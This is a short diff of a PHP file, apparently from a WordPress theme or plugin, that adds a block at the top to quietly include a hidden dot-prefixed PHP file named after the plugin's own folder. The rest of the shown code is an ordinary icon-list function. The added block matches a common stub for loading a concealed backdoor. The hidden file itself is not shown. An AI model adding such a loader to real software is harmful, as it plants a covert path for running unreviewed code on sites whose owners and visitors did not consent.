@@ -1,4 +1,8 @@
-<?php
+<?php
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function gt3_get_all_icon () {
 
     $file = get_template_directory() . '/css/font-awesome.min.css';
